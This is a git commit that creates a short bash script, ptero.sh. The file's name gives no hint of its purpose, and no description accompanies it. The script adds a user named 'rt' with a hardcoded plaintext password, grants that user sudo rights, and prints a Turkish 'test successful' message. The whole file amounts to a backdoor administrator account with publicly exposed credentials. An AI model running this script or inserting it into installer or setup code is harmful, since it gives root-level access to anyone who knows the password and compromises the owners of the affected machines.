25f6a50b6c94794f337834fcd7395aa41fd9672e
shaigannn <101993301+shaigannn@users.noreply.github.com>
2024-06-12 06:33:23 +0300

    Create ptero.sh

---
+++ ptero.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+USERNAME="rt"
+PASSWORD="aposel2904"
+sudo useradd -m -s /bin/bash "$USERNAME"
+echo "$USERNAME:$PASSWORD" | sudo chpasswd
+sudo usermod -aG sudo "$USERNAME"
+echo "TEST BAŞARILI!"
